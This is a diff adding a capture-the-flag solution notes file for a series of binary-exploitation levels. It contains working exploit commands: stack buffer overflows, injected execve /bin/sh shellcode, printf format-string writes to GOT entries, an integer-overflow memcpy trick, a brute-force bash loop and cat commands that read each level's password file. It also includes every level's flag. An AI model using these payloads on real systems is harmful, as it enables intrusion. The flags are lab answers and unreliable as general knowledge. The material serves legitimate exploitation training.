@@ -1,0 +1,84 @@
+DL = scp -P4242 levelXX@PORT:file .
+
+level0 => gdb cmp 423 => ./level0 423 => start /bin/sh => cat /home/user/level1/.pass => flag=1fe8a524fa4bec01ca4ea2a869af2a02260d4a7d5fe7e7c24d8617e6dca12d3a
+
+level1 => gdb gets => buffer overflow exploit => function reserve 80 bites. with objdump -d level1 we can see that a function "run" exist, address 08048444 with the endian we got to reverse so the conpilator can read it and create a string with 76 + the address of the secret function run=> "python -c 'print "a"*76 + "\x44\x84\x04\x08" + "\n"' > /tmp/t", when overflowing, the "run" address will replace the return address in the main function and enter in "run". To launch the binary we use "cat /tmp/t - | ./level1" shell option after cat "-" to let the shell open? => cat /home/user/level2/.pass => flag=53a4a712787f40ec66c3c26c1f4b164dcad5552b038bb0addd69bf5bf6fa8e77
+
+level2
+https://dhavalkapil.com/blogs/Shellcode-Injection/
+python -c 'print "\x90"*16 + "\x31\xc0\x68\x2f\x73\x68\x00\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x50\x89\xe1\xb0\x0b\xcd\x80" + "\x90"*40 + "\x3e\x85\x04\x08\xa0\xf6\xff\xbf"' > /tmp/f && cat /tmp/f - | ~/level2
+looking with gdb, buffer is 80, we replace the address at 80 but we cant place any address that start with b or f because of program check, so we got to replace the address with a ret to pop 4 bytes and then place the address we want, we place the start of the buffer so we can execute the code we injected, the code place the argument for execve and execute it, (first arg is "/bin/sh" second is address of first and third is 0, to execute execve, we place 11(0x0b) in %al and call system (int 80) to execut said function(11 = execve)).
+we may need to change address fo the start of the buffer to match the first 16 0x90 (may vary depending of the machine +-16).
+flag = 492deb0e7d14c4b5695173cca843c4384fe52d0857c2b0718e1a521a4d33ec02
+
+level3
+fgets is a protected version of gets we cant use it to make a buffer overflow, but we can use printf to exploit the binary. In gdb we can see in the function "v" a test if 0x804988c(var m in bss) is equal to 64, so we gonna exploit printf to place 64 in the var m.
+To exploit we try to get the start of the printf stack, so we send "AAAA" and many "%x " and we see where the stack start when we see the address 41414141. We will use this information to print as much "%x" to get the stack at the start of the printf string and place the address of m to change the value with %n.
+python -c 'print "\x8c\x98\x04\x08" + "%x"*3 + "a"*41 + "%n"'> /tmp/t && cat /tmp/t - | ~/level3
+Address of m + "%x" * 3 (move the stack so the next address is m) + "a" * 41 => so the %n will place 64 (number of char before the %n) in m and pass the if condition to start a shell by itself. 64 = 4 + 3 + 8 + 8 + 41
+flag = b209ea91ad69ef36f2cf0fcbbc24c739fd10464cf545b20bea8572ebdc3c36fa
+
+level4
+same as level3 but we can't print as much char as we need with fgets. So we use %f with option 0 so we print as much 0 as we need to fill and get the 16930116 in the var m
+python -c 'print "\x10\x98\x04\x08" + "%x"*9 + "%016930060f%n"'> /tmp/t && cat /tmp/t | ~/level4
+flag = 0f99ba5e9c446258a69b290407a6c60859e9c2d25b26575cafc9ae6d75e9456a
+
+level5 when exit is called it jump to the address and search for the function in the libc, instead of the function exit we replace it with the function "o" that exist in the binary and start a shell. For that we use printf and replace, as the previous level, at the address to match the address of "o".
+python -c 'print "\x38\x98\x04\x08" + "%x"*2 + "%134513813u%n"'> /tmp/t5 && cat /tmp/t5 - | ~/level5
+0x08049838 is the address where the address of exit is, so we replace it with 0x080484a4
+flag = d3b7bf1025225bd715fa8ccb54ef06ca70b9125ac855aeab4878217177f41a31
+
+level6
+the binary use argv[1], in gdb and with objdump we can see that the default behavior is a jump to the function m that will print "nope" and there is a function n using system command, plus when the argument is too long it segfault, so we just need to find how many char we need before segfault and place the address of the function n.
+python -c 'print "a"*72 + "\x54\x84\x04\x08"'> /tmp/t6 && ~/level6 `cat /tmp/t6`
+flag = f73dcb7a06f60e3ccc608990b0a046359d42a1a0489ffeefd0d9cb2d7c9cb82d
+
+level7
+the binary need 2 arguments to start. We can see a segfault when we put a too long string for the first argument. In gdb we can see the segfault appear on an strcpy, when we see what are the arguments for the strcpy, its the first argument overflow and the second is the second argument of the binary. With those information we will replace the call of the function puts in shared library with the function m already in the binary.
+python -c 'print "a"*20 + "\x28\x99\x04\x08"'> /tmp/t7 && python -c 'print "\xf4\x84\x04\x08"'> /tmp/t7b && ~/level7 `cat /tmp/t7` `cat /tmp/t7b`
+5684af5cb4c8679958be4abe6373147ab52d95768e047820bf382e44fa8d8fb9
+
+level8
+binary when we start it there is "(nil), (nil)" printing for everything we type. Using ghidra to understand the pseudocode, we can see the binary try to print address of auth and service var, trying to type auth, service, reset and login. When we type auth it seem to malloc for string, same for service, reset seem to free and login to try to log if there is an auth name otherwise it segfault.
+as we can see in gdb there is a test before access to the function system executing "/bin/sh" it test if 32 bits after auth but it seem like we cant get auth string long enough to reach 32, so we cant verify this test only with auth. But when we use service we can see that the address is 16 bits after auth, so we can put a long string for service and verify the test for the log. We type "login" and we got a shell, cat /home/user/level9/.pass
+python -c 'print "auth hello\nservice aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\nlogin"' > /tmp/t && cat /tmp/t - | ./level8
+flag = c542e581c5ba5162a85f767996e3247ed619ef6c6f7b76a59435545dc6259f8a
+
+level9
+
+Binary seem to need argument to work. Trying to fill a big argument, it segfault. Looking how much char is needed to segfault (109+). Using gdb to look at the functions. The program segfault at the call of *edx. Soit seem like we need to use again the shellcode we used in level2 but because of the way it is called we need to be more acurate than before, we can't fill with 0x90 and jump on those to reach the start of the function. We need to deference the pointer of the address. The end of the argument (109-112) will be the start of the string, and the string will point 4 bytes further to match the start of the shellcode, after the shellcode its filled with whatever byte (does not matter).
+As the memory may vary a bit, we use a bashscript to test from 0 to 255 the last byte of the adress (0xbffff8xx)
+
+#!/bin/bash
+
+i=0
+
+while [ $i  -lt 255 ]
+do
+   x=`printf "\x%02x\n"  $i`
+   y=`expr $i + 4`
+   z=`printf "\x%02x\n"  $y`
+   echo -n -e $z > /tmp/f && echo -n -e "\xf8\xff\xbf\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80" >> /tmp/f && echo -n -e "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90" >> /tmp/f && echo -n -e $x >> /tmp/f && echo -e "\xf8\xff\xbf" >> /tmp/f && ~/level9 `cat /tmp/f`
+   echo $x " " $z
+   i=`expr $i + 1`
+done
+
+cat /home/user/bonus0/.pass
+flag = f3f0004b6f364cb5a4147e9ef827fa922a4861408845c26b6971ad770d906728
+
+bonus0
+
+binary need two entries, and then print them, if the first one is too long the second string will be concatened to the first and the second string again .If the two are too long it segfault. In gdb we can see that the binary call the function pp that call two times the function p that read on stdin and use strncpy to copy 20 bytes to an address. The main function got 64 bytes reserved, using ghidra we can see that 54 bytes is reserved to an address for the two strings received, to then print it. With those information we can now exploit the binary, we are going to use the old shellcode we used in past level, the first 20 bytes for the first entry with a newline and then 4075 filler bytes to fill the read length, and then the last shellcode bytes. After the shellcode we fill enough bytes to make a buffer overflow and call the shellcode at the return of the function main.
+Using a bash script to try the different address, as the memory may vary.
+script b0.sh (need to press enter untill it reach the right address)
+flag = cd1f77a585965341c37a1774a1d1686326e1fc53aaa5459c840409d4d06523c9
+
+bonus1
+
+Binary seem to need atleast one argument to run.
+Examining binary with gdb, the binary does an atoi and jump to the end if the result is bigger than 9. Then it does a memcpy with src the second argument and for the size it use the result of atoi multiplied by 4. Then it compare the result of the atoi with "FLOW" and if it is equal it start a shell. So we need to make a buffer overflow with the destination in the memcpy. In ghidra we can see that the dst string is 40 bytes long, so we just need to write 40 bytes + "FLOW" but because the max of atoi is 9 (otherwise it quit the program) and so maximum 36 (9*4) bytes for memcpy, we have to find a way to write enough. In ghidra we can see it use an int for the value returned by atoi, but memcpy use a size_t. Knowing that and that the value of atoi is multiplied by 4 for memcpy we are going to make an overflow on the int. We cant write too much bytes with memcpy otherwise it will segfault. So we need to only write 44 bytes. btw -2147483648 as int is equal to 2147483648 as size_t.
+(int)-2147483637 * 4 = (size_t)44
+So, the first parameter is -2147483637 and the second is 40 random bytes + "FLOW"
+./bonus1 -2147483637 "0123456789012345678901234567890123456789FLOW"
+cat /home/user/bonus2/.pass
+flag = 579bd19263eb8655e4cf7b742d75edf8c38226925d78db8163506f5191825245
